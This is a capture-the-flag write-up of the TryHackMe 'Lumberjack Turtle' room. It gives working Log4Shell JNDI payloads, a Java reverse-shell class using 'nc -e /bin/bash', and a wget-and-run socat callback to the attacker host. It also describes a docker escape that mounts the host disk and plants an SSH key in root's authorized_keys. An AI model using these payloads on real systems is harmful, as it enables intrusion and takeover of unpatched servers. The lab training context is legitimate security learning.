# Lumberjack Turtle

## Introduction

Welcome to my another writeup! In this TryHackMe [Lumberjack Turtle](https://tryhackme.com/room/lumberjackturtle) room, you'll learn: Log4Shell, docker container escape! Without further ado, let's dive in.

## Background

> No logs, no crime... so says the lumberjack.

> Difficulty: Medium

```
What do lumberjacks and turtles have to do with this challenge?

Hack into the machine. Get root.  You'll figure it out.
```

- Overall difficulty for me: Easy
    - Initial foothold: Easy
    - Privilege escalation: Very easy

# Service Enumeration

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# export RHOSTS=10.10.87.159

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE     REASON         VERSION
22/tcp open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=
|   256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t
80/tcp open  nagios-nsca syn-ack ttl 62 Nagios NSCA
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Nagios NSCA

## HTTP on Port 80

**Let's take a look at the home page!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# curl http://$RHOSTS/
What you doing here? There is nothing for you to C. Grab a cup of java and look deeper.
```

**Let's enumerate hidden directory via `gobuster`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt
[...]
/~logs                (Status: 200) [Size: 29]
/error                (Status: 500) [Size: 73]
```

- Found directory: `/~logs`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# curl http://$RHOSTS/~logs    
No logs, no crime. Go deeper.
```

Hmm... **Let's use `feroxbuster` to go deeper**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# feroxbuster -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt --force-recursion -d 10 -o ferox.txt
[...]
200      GET        1l       19w       87c http://10.10.87.159/
200      GET        1l        6w       29c http://10.10.87.159/~logs
500      GET        1l        1w        0c http://10.10.87.159/error
200      GET        1l        8w       47c http://10.10.87.159/~logs/log4j
[...]
```

- Found directory: `/log4j`!

**`/~logs/log4j`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# curl http://$RHOSTS/~logs/log4j
Hello, vulnerable world! What could we do HERE?
```

**Since the directory indicates us about `Log4Shell`, or log4j remote code execution vulnerability in 2021, I'll use a payload to test it:** 

There are many articles and blogs talking about `Log4Shell` RCE exploit:

- [Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# nc -lnvp 1337      
listening on [any] 1337 ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# curl -H 'X-Api-Version: ${jndi:ldap://10.18.61.134:1337/}' http://$RHOSTS/~logs/log4j

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# nc -lnvp 1337      
listening on [any] 1337 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.87.159] 45476
0
 `�
```

**It's vulnerable to `Log4Shell`!!**

# Initial Foothold

**To exploit that, I'll:**

- Create a malicious Java payload: ([Source](https://riteshpuvvada.github.io/posts/log4j/))

```java
public class exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc {YOUR_IP} {YOUR_PORT} -e /bin/bash");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- Compile it in **Java version 8**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# javac exploit.java -source 8 -target 8

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# ls -lah
[...]
-rw-r--r--  1 root root  528 Sep 27 23:12 exploit.class

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# file exploit.class                     
exploit.class: compiled Java class data, version 52.0 (Java 1.8)
```

- Host a LDAP server via [marshalsec](https://github.com/mbechler/marshalsec):

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# java -cp /opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://10.18.61.134/#exploit'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

This will send the connected LDAP connection to `http://10.18.61.134/exploit.class`.

- Host a web server via python's `http.server` module:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# nc -lnvp 1337
listening on [any] 1337 ...
```

- Run the Log4Shell payload:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# curl -H 'X-Api-Version: ${jndi:ldap://10.18.61.134:1389/exploit}' http://$RHOSTS/~logs/log4j
Hello, vulnerable world! Did we get pwnage?
```

- Reverse shell call back:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.87.159] 38039
whoami;hostname;id;ip a
root
81fbbf1def70
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lumberjack-Turtle/images/a1.png)

I'm docker container's `root`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

wget http://10.18.61.134/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat TCP:10.18.61.134:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
2022/09/27 23:43:51 socat[21089] N opening character device "/dev/pts/1" for reading and writing
2022/09/27 23:43:51 socat[21089] N listening on AF=2 0.0.0.0:443
                                                                2022/09/27 23:45:52 socat[21089] N accepting connection from AF=2 10.10.87.159:37770 on AF=2 10.18.61.134:443
                                                                  2022/09/27 23:45:52 socat[21089] N starting data transfer loop with FDs [5,5] and [7,7]
                                              bash-4.4# 
bash-4.4# stty rows 22 columns 107
bash-4.4# export TERM=xterm-256color
bash-4.4# ^C
bash-4.4# 
```

**flag1.txt:**
```
bash-4.4# find / -type f -name "*flag*" 2>/dev/null
[...]
/opt/.flag1

bash-4.4# cat /opt/.flag1 
THM{Redacted}
```

# Privilege Escalation

## Docker root to host root

In the `ip a` command, it reveals that **we're inside a docker container** (`172.17.0.2`):

```
bash-4.4# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**To escape this docker container, I'll:**

- Check host disk via `fdisk`:

```
bash-4.4# fdisk -l
Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device     Boot Start      End  Sectors Size Id Type
/dev/xvda1 *     2048 83886046 83883999  40G 83 Linux


Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
```

> In a well configured docker containers won't allow command like `fdisk -l`. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive. (Source: [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1))

Armed with this information, **we can just mount the host drive (`/dev/xvda1`) to `/mnt`!**

- Mount the host drive:

```
bash-4.4# mkdir /mnt/mount
bash-4.4# mount /dev/xvda1 /mnt/mount/

bash-4.4# ls -lah /mnt/mount/root/
total 28
drwx------    4 root     root        4.0K Dec 13  2021 .
drwxr-xr-x   22 root     root        4.0K Sep 28 02:52 ..
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 ...
-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
drwx------    2 root     root        4.0K Dec 13  2021 .ssh
-r--------    1 root     root          29 Dec 13  2021 root.txt
```

- Add our public SSH key into `/mnt/mount/root/.ssh/authorized_keys`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Lumberjack-Turtle]
└─# mkdir .ssh;cd .ssh/          
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/Lumberjack-Turtle/.ssh]
└─# ssh-keygen      
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Lumberjack-Turtle/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:

┌──(root🌸siunam)-[~/…/thm/ctf/Lumberjack-Turtle/.ssh]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCTZ1N7E6z0JZr3Pr9BlosLZrEu9ok+65BHehPhrjy2iZuzdSLuoGb4TRgzaUNXlIvKTYq6yKo1G2PF5Yr/5Ux8VHOR01L48b6vMdiGYQMBXYwkHOap/I6A6sie3DdQgpW1GbEWIkI3hVPucyD9oUdPBgPafIRFJ/oAPN/qerEg/raMq5c9IjqxmLA1FpqMaW7ZRpBioT3+F7FNfagHLNDBSHrDPN8ooelOrZ6eD62qpArsvrotLzFmXWlel0kikM/FZktJtA3+EvwYOBBag8zZIvZE/6oZRUaiw67DhOTjGcsVt8icpSEOvhE+txUc4+5Bhym+olR5M5jOIZwOZkDlkrQW52UswlqCi34eOGfNXO3Fscdv7YmKzpSq2XIxCMiyDN+lnPKEML/AltMEHNNVRm0lCFnJHZV/FZuyOLwKccX6i8tQcYzcBxtbTFslF4VOhrv3ThmMFr0dbjDg7PV4fwB4BBLwUL8BtURcQqglybgmx/FvHpGpv8fTfOoplL8= root@siunam
```

```
bash-4.4# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCTZ1N7E6z0JZr3Pr9BlosLZrEu9ok+65BHehPhrjy2iZuzdSLuoGb4TRgzaUNXlIvKTYq6yKo1G2PF5Yr/5Ux8VHOR01L48b6vMdiGYQMBXYwkHOap/I6A6sie3DdQgpW1GbEWIkI3hVPucyD9oUdPBgPafIRFJ/oAPN/qerEg/raMq5c9IjqxmLA1FpqMaW7ZRpBioT3+F7FNfagHLNDBSHrDPN8ooelOrZ6eD62qpArsvrotLzFmXWlel0kikM/FZktJtA3+EvwYOBBag8zZIvZE/6oZRUaiw67DhOTjGcsVt8icpSEOvhE+txUc4+5Bhym+olR5M5jOIZwOZkDlkrQW52UswlqCi34eOGfNXO3Fscdv7YmKzpSq2XIxCMiyDN+lnPKEML/AltMEHNNVRm0lCFnJHZV/FZuyOLwKccX6i8tQcYzcBxtbTFslF4VOhrv3ThmMFr0dbjDg7PV4fwB4BBLwUL8BtURcQqglybgmx/FvHpGpv8fTfOoplL8= root@siunam" > /mnt/mount/root/.ssh/authorized_keys
```

- SSH into the target machine:

```
┌──(root🌸siunam)-[~/…/thm/ctf/Lumberjack-Turtle/.ssh]
└─# ssh -i id_rsa root@$RHOSTS
[...]
root@lumberjackturtle:~# whoami;hostname;id;ip a
root
lumberjackturtle
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:75:4f:ed:40:01 brd ff:ff:ff:ff:ff:ff
    inet 10.10.87.159/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2945sec preferred_lft 2945sec
    inet6 fe80::75:4fff:feed:4001/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:15:07:5e:8a brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:15ff:fe07:5e8a/64 scope link 
       valid_lft forever preferred_lft forever
5: veth9f1c5c7@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 86:5a:35:b0:21:bb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::845a:35ff:feb0:21bb/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

```
root@lumberjackturtle:~# cat /root/root.txt 
Pffft. Come on. Look harder.
```

```
root@lumberjackturtle:~# ls -lah
total 36K
drwx------  6 root root 4.0K Sep 28 04:02 .
drwxr-xr-x 22 root root 4.0K Sep 28 02:52 ..
drwxr-xr-x  2 root root 4.0K Dec 13  2021 ...
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Sep 28 04:02 .cache
drwx------  3 root root 4.0K Sep 28 04:02 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4.0K Dec 13  2021 .ssh
-r--------  1 root root   29 Dec 13  2021 root.txt
```

- Found directory: `...`

**root.txt:**
```
root@lumberjackturtle:~# cat .../._fLaG2 
THM{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. Log4Shell (CVE-2021-44228)
3. Docker Container Escape via Mounting Host Drive